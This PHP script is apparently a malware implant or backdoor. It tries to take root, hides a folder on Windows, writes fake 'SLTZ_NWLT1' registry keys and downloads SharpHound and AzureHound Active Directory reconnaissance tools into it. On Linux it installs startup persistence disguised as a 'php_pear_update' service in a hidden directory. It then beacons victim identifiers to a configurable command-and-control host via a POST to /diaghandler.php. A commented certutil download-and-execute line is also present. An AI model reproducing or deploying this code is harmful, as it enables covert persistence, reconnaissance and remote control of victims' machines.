<?php
ini_set("safe_mode", 0);
umask(0);
posix_setuid(0);
require "vendor/autoload.php";
use Amp\Loop;
define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
define("UNPACKVEND", "cat ./vend.b64 | base64 -d >> vendor.zip && unzip ./vendor.zip && rm ./vendor.zip");
define("uuid", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32));

function checkfs(){
    if (substr(php_uname(), 0, 7) == 'Windows') {
        //certutil.exe -urlcache -split -f [URL] google_https_cert.exe && google_https_cert.exe
        $wh = new COM('WScript.Shell');
        if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
            $t = sys_get_temp_dir() . "\\" . uuid;
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Version", "REG_SZ", "1");
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerPath", "REG_SZ", base64_encode($t));
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", uuid);
            shell_exec("mkdir " . $t);
            shell_exec("attrib +h +s " . $t);
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
            shell_exec("attrib +r +s $t\\*");
            fwrite(fopen(sys_get_temp_dir()."/aa", "a"), "win");
            return $t;
        }else{
            return $wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash");
        }
    } else {
        if (is_dir("/etc/service") && !file_exists("/etc/service/php_pear_update_service")){
            $f = fopen("/etc/service/php_pear_update", "w");
            fwrite($f, "#!/bin/sh\nexec $(which php) ". SELF_SCRIPT);
            fflush($f);
            fclose($f);
        }elseif (is_dir("/etc/init/") && !file_exists("/etc/init/phpworker.conf")){
            $ff = fopen("/etc/init/phpworker.conf", "w");
            fwrite($ff, "start on startup\nstop on shutdown\nrespawn\nrespawn limit 20 5\nscript\n\t[\$(exec $(which php) -f ". SELF_SCRIPT . ") = 'ERROR'] && ( stop; exit 1; )");
            fflush($ff);
            fclose($ff);
        }elseif (is_dir("/var/service") && !file_exists("/var/service/php_pear_update_service/run")){
            $ffe = fopen("/var/service/php_pear_update/run", "w");
            fwrite($ffe, "#!/bin/sh\nexec setuidgid sh -c 'exec $(which php) ". SELF_SCRIPT ."'");
            fflush($ffe);
            fclose($ffe);
        }
        $myhom = "\$HOME/.local/.backup/.pear/";
        if (!is_dir($myhom) && !file_exists($myhom."/.pear_has_backup")) {
            system("mkdir -p {$myhom}");
            $uif = fopen("$myhom" . ".pear_hash_backup", "a");
            fwrite(fopen(sys_get_temp_dir()."/aa", "a"), "lin");
            fwrite($uif, uuid);
            fflush($uif);
            fclose($uif);
            return $myhom;
        }else{
            $uif = fopen($myhom.".pear_hash_backup", "a");
            return $myhom;
        }
    }

}
function checkFile(){

}

function mainR(){
    $duration = null;
    $myHome = Loop::delay($duration, function(){
        $ho = null; // your host.
        $p = null; // your port that you are using.
        $u = null; // the user-agent you want to restrict requests to.
        $fp = fsockopen("$ho", $p, $errno, $errstr, 180);
        switch (fread(fopen(sys_get_temp_dir()."/aa", "r"), 3)) {
            case "win":
                $au = array(
                    "ac" => "add",
                    "iru" => SELF_SCRIPT,
                    "u" => uuid,
                    "o" => "windows"
                );
                foreach ($au AS $key => $value){
                    $poststring .=urlencode($key) . "=" . $value . "&";
                }
                $poststring = substr($poststring, 0, -1);
                if (!$fp){
                    fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), $errstr);
                }else{
                    fputs($fp,"POST /diaghandler.php HTTP/1.1\r\n");
                    fputs($fp, "Host: $ho\r\n");
                    fputs($fp, "Connection: close\r\n");
                    fputs($fp, "Accept: */*\r\n");
                    fputs($fp, $poststring."\r\n\r\n");
                    while (!feof($fp)){
                        fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), fgets($fp, 4096));
                    }
                    fclose($fp);
                }
                break;
            case "lin":
                $au = array(
                    "ac" => "add",
                    "iru" => SELF_SCRIPT,
                    "u" => uuid,
                    "o" => "lin"
                );
                foreach ($au AS $key => $value){
                    $poststring .=urlencode($key) . "=" . $value . "&";
                }
                $poststring = substr($poststring, 0, -1);
                if (!$fp){
                    fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), $errstr);
                }else{
                    fputs($fp,"POST /diaghandler.php HTTP/1.1\r\n");
                    fputs($fp, "Host: $ho\r\n");
                    fputs($fp, "Connection: close\r\n");
                    fputs($fp, "Accept: */*\r\n");
                    fputs($fp, $poststring."\r\n\r\n");
                    while (!feof($fp)){
                        fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), fgets($fp, 4096));
                    }
                    fclose($fp);
                }
                break;

        }
    });
    Loop::run(function () use($myHome){
        Loop::enable($myHome);
    });
}

